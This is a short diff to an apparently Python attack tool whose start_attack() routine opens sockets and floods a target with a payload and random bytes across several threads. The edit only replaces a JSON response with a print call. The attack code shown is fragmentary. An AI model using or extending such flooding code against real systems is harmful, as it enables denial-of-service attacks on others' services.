@@ -27,11 +27,12 @@ def start_attack():
             s.send(payload.encode())
             s.send(os.urandom(int(num_bytes)))
             s.close()
-        return jsonify({'success': True, 'message': 'Attack finished successfully.'})
-
+        return print("{'success': True, 'message': 'Attack finished successfully.'}")
+        
     for _ in range(int(data.get('threads', 10))):
         with suppress(Exception):
             attack()
+        
 
     
 if __name__ == '__main__':
